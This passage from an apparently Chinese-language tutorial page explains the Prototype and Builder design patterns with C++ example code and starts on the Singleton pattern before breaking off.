class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainForm</span> :</span> <span class="hljs-keyword">public</span> Form &#123;<br>    ISplitter*  prototype;<span class="hljs-comment">//原型对象</span><br><span class="hljs-keyword">public</span>:<br>    MainForm(ISplitter*  prototype)&#123;<br>        <span class="hljs-keyword">this</span>-&gt;prototype=prototype;<br>    &#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Button_Click</span><span class="hljs-params">()</span></span>&#123;<br>ISplitter * splitter=prototype-&gt;clone(); <span class="hljs-comment">//克隆原型</span><br>        splitter-&gt;split();<br>&#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>当一个系统应该独立于它的产品创建、构成和表示时，要使用Prototype模式。当一个类的实例只能有几个不同状态组合中的一种时。建立相应数目的原型并克隆它们可能比每次用合适的状态手工实例化该类更方便一些。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/img/picgo/2021/10/24/21-39-21-fbc3fb.png" srcset="/img/loading.gif" lazyload style="zoom:80%;"></p><h4><span id="抽象代码结构">抽象代码结构</span></h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Prototype</span><br><span class="hljs-comment"> * declares an interface for cloning itself</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Prototype</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-keyword">virtual</span> ~Prototype() &#123;&#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> Prototype* <span class="hljs-title">clone</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> <span class="hljs-title">type</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Concrete Prototype A and B</span><br><span class="hljs-comment"> * implement an operation for cloning itself</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConcretePrototypeA</span> :</span> <span class="hljs-keyword">public</span> Prototype<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  ~ConcretePrototypeA() &#123;&#125;<br>  <br>  <span class="hljs-function">Prototype* <span class="hljs-title">clone</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ConcretePrototypeA();<br>  &#125;<br>  <span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> <span class="hljs-title">type</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">"type A"</span>;<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConcretePrototypeB</span> :</span> <span class="hljs-keyword">public</span> Prototype<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  ~ConcretePrototypeB() &#123;&#125;<br>  <br>  <span class="hljs-function">Prototype* <span class="hljs-title">clone</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ConcretePrototypeB();<br>  &#125;<br>  <span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> <span class="hljs-title">type</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">"type B"</span>;<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Client</span><br><span class="hljs-comment"> * creates a new object by asking a prototype to clone itself</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Client</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    types[ <span class="hljs-number">0</span> ] = <span class="hljs-keyword">new</span> ConcretePrototypeA();<br>    types[ <span class="hljs-number">1</span> ] = <span class="hljs-keyword">new</span> ConcretePrototypeB();<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">remove</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">delete</span> types[ <span class="hljs-number">0</span> ];<br>    <span class="hljs-keyword">delete</span> types[ <span class="hljs-number">1</span> ];<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">static</span> Prototype* <span class="hljs-title">make</span><span class="hljs-params">( <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> index )</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">if</span> ( index &gt;= n_types )<br>    &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>    &#125;    <br>    <span class="hljs-keyword">return</span> types[ index ]-&gt;clone();<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br><br><span class="hljs-keyword">private</span>:<br>  <span class="hljs-keyword">static</span> Prototype* types[ <span class="hljs-number">2</span> ]; <span class="hljs-comment">// declaration</span><br>  <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> n_types;<br>&#125;;<br><br>Prototype* <span class="hljs-built_in">Client</span>::types[ <span class="hljs-number">2</span> ]; <span class="hljs-comment">// definition</span><br><span class="hljs-keyword">int</span> <span class="hljs-built_in">Client</span>::n_types = <span class="hljs-number">2</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-built_in">Client</span>::init();<br>  <br>  Prototype *prototype1 = <span class="hljs-built_in">Client</span>::make( <span class="hljs-number">0</span> );<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Prototype: "</span> &lt;&lt; prototype1-&gt;type() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>  <span class="hljs-keyword">delete</span> prototype1;<br>  <br>  Prototype *prototype2 = <span class="hljs-built_in">Client</span>::make( <span class="hljs-number">1</span> );<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"Prototype: "</span> &lt;&lt; prototype2-&gt;type() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>  <span class="hljs-keyword">delete</span> prototype2;<br>  <br>  <span class="hljs-built_in">Client</span>::<span class="hljs-built_in">remove</span>();<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="builder">Builder</span></h3><p>在软件系统中，有时候面临着“一个复杂对象”的创建工作，它的创建过程是一套固定的组合方法，和多个不同的被组合的子对象。</p><p>Builder将一个复杂对象的构建与其表示相分离，使得同样的构建过程(稳定)可以创建不同的表示(变化)。</p><p>这个类似TemplateMethod，不过Builder是针对对象的创建来进行设计的。</p><h4><span id="示例4">示例4</span></h4><p>实现一个程序，可以创建出不同种类的房子图像。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// House抽象基类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">House</span>&#123;</span><br>    <span class="hljs-comment">//...</span><br>&#125;;<br><br><span class="hljs-comment">// House建房配置的基类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HouseBuilder</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">House* <span class="hljs-title">GetResult</span><span class="hljs-params">()</span></span>&#123; <span class="hljs-keyword">return</span> pHouse; &#125;<br>    <span class="hljs-keyword">virtual</span> ~HouseBuilder()&#123;&#125;<br><span class="hljs-keyword">protected</span>:<br>    House* pHouse;<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">BuildPart1</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">BuildPart2</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">BuildPart3</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">BuildPart4</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">BuildPart5</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br>&#125;;<br><br><span class="hljs-comment">// 通用图形绘制逻辑，稳定</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HouseDirector</span>&#123;</span><br>    HouseBuilder* pHouseBuilder;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">// 注意不要在C++的构造函数中调用虚函数</span><br>    HouseDirector(HouseBuilder* pHouseBuilder)&#123;<br>        <span class="hljs-keyword">this</span>-&gt;pHouseBuilder=pHouseBuilder;<br>    &#125;<br>    <span class="hljs-function">House* <span class="hljs-title">Construct</span><span class="hljs-params">()</span></span>&#123;<br>        pHouseBuilder-&gt;BuildPart1();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)&#123;<br>            pHouseBuilder-&gt;BuildPart2();<br>        &#125;<br>        <span class="hljs-keyword">bool</span> flag=pHouseBuilder-&gt;BuildPart3();<br>        <span class="hljs-keyword">if</span>(flag)&#123; pHouseBuilder-&gt;BuildPart4(); &#125;<br>        pHouseBuilder-&gt;BuildPart5();<br>        <span class="hljs-keyword">return</span> pHouseBuilder-&gt;GetResult();<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// 具体类，StoneHouse的参数类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">StoneHouse</span>:</span> <span class="hljs-keyword">public</span> House&#123;...&#125;;<br><br><span class="hljs-comment">// 具体类，构建StoneHouse各个部分的具体算法实现</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">StoneHouseBuilder</span>:</span> <span class="hljs-keyword">public</span> HouseBuilder&#123;<br><span class="hljs-keyword">protected</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">BuildPart1</span><span class="hljs-params">()</span></span>&#123;...&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">BuildPart2</span><span class="hljs-params">()</span></span>&#123;...&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">BuildPart3</span><span class="hljs-params">()</span></span>&#123;...&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">BuildPart4</span><span class="hljs-params">()</span></span>&#123;...&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">BuildPart5</span><span class="hljs-params">()</span></span>&#123;...&#125;<br>    <br>&#125;;<br></code></pre></div></td></tr></table></figure><p>这样如果有其它种类的House，可以新创建House和HouseBuilder的子类即可。</p><p>Builder模式主要用于“分步骤构建一个复杂的对象”。在这其中“分步骤”是一个稳定的算法，而复杂对象的各个部分则经常变化。</p><p>变化点在哪里，封装哪里——Builder模式主要在于应对“复杂对象各个部分”的频繁需求变动。</p><p><img src="C:/Users/qw/Desktop/CPP/images/设计模式2_pic/image-20211024221706417.png" srcset="/img/loading.gif" lazyload alt="image-20211024221706417" style="zoom:80%;"></p><h4><span id="抽象代码结构">抽象代码结构</span></h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Product</span><br><span class="hljs-comment"> * the final object that will be created using Builder</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Product</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">makeA</span><span class="hljs-params">( <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;part )</span></span><br><span class="hljs-function">  </span>&#123;<br>    partA = part;<br>  &#125;<br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">makeB</span><span class="hljs-params">( <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;part )</span></span><br><span class="hljs-function">  </span>&#123;<br>    partB = part;<br>  &#125;<br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">makeC</span><span class="hljs-params">( <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;part )</span></span><br><span class="hljs-function">  </span>&#123;<br>    partC = part;<br>  &#125;<br>  <span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> <span class="hljs-title">get</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> (partA + <span class="hljs-string">" "</span> + partB + <span class="hljs-string">" "</span> + partC);<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>  <br><span class="hljs-keyword">private</span>:<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> partA;<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> partB;<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> partC;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Builder</span><br><span class="hljs-comment"> * abstract interface for creating products</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Builder</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-keyword">virtual</span> ~Builder() &#123;&#125;<br>  <br>  <span class="hljs-function">Product <span class="hljs-title">get</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> product;<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">buildPartA</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">buildPartB</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>  <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">buildPartC</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>  <span class="hljs-comment">// ...</span><br><br><span class="hljs-keyword">protected</span>:<br>  Product product;<br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Concrete Builder X and Y</span><br><span class="hljs-comment"> * create real products and stores them in the composite structure</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConcreteBuilderX</span> :</span> <span class="hljs-keyword">public</span> Builder<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">buildPartA</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    product.makeA( <span class="hljs-string">"A-X"</span> );<br>  &#125;<br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">buildPartB</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    product.makeB( <span class="hljs-string">"B-X"</span> );<br>  &#125;<br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">buildPartC</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    product.makeC( <span class="hljs-string">"C-X"</span> );<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConcreteBuilderY</span> :</span> <span class="hljs-keyword">public</span> Builder<br>&#123;<br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">buildPartA</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    product.makeA( <span class="hljs-string">"A-Y"</span> );<br>  &#125;<br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">buildPartB</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    product.makeB( <span class="hljs-string">"B-Y"</span> );<br>  &#125;<br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">buildPartC</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    product.makeC( <span class="hljs-string">"C-Y"</span> );<br>  &#125;<br>  <span class="hljs-comment">// ...</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Director</span><br><span class="hljs-comment"> * responsible for managing the correct sequence of object creation</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Director</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>  Director() : builder() &#123;&#125;<br>  <br>  ~Director()<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( builder )<br>    &#123;<br>      <span class="hljs-keyword">delete</span> builder;<br>    &#125;<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">set</span><span class="hljs-params">( Builder *b )</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">if</span> ( builder )<br>    &#123;<br>      <span class="hljs-keyword">delete</span> builder;<br>    &#125;<br>    builder = b;<br>  &#125;<br>  <br>  <span class="hljs-function">Product <span class="hljs-title">get</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">return</span> builder-&gt;<span class="hljs-built_in">get</span>();<br>  &#125;<br>  <br>  <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">construct</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  </span>&#123;<br>    builder-&gt;buildPartA();<br>    builder-&gt;buildPartB();<br>    builder-&gt;buildPartC();<br>    <span class="hljs-comment">// ...</span><br>  &#125;<br>  <span class="hljs-comment">// ...</span><br><br><span class="hljs-keyword">private</span>:<br>  Builder *builder;<br>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  Director director;<br>  director.<span class="hljs-built_in">set</span>( <span class="hljs-keyword">new</span> ConcreteBuilderX );<br>  director.construct();<br>  <br>  Product product1 = director.<span class="hljs-built_in">get</span>();<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"1st product parts: "</span> &lt;&lt; product1.<span class="hljs-built_in">get</span>() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>  <br>  director.<span class="hljs-built_in">set</span>( <span class="hljs-keyword">new</span> ConcreteBuilderY );<br>  director.construct();<br>  <br>  Product product2 = director.<span class="hljs-built_in">get</span>();<br>  <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"2nd product parts: "</span> &lt;&lt; product2.<span class="hljs-built_in">get</span>() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2><span id="对象性能相关模式">对象性能相关模式</span></h2><p>处理面向对象编程所产生的额外代价，比如太多的对象创建的资源消耗等问题。</p><p>典型模式：</p><ul><li>Singleton</li><li>Flyweight</li></ul><h3><span id="singleton">Singleton</span></h3><p>处理一个类，只允许一个实例存在，或者只需要存在一个对象即可。</p><p>Singleton保证一个类仅有一个实例，并提供一个访问它的全局访问点。</p><h4><span id="示例5">示例5</span></h4><p>单线程环境下实现</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div 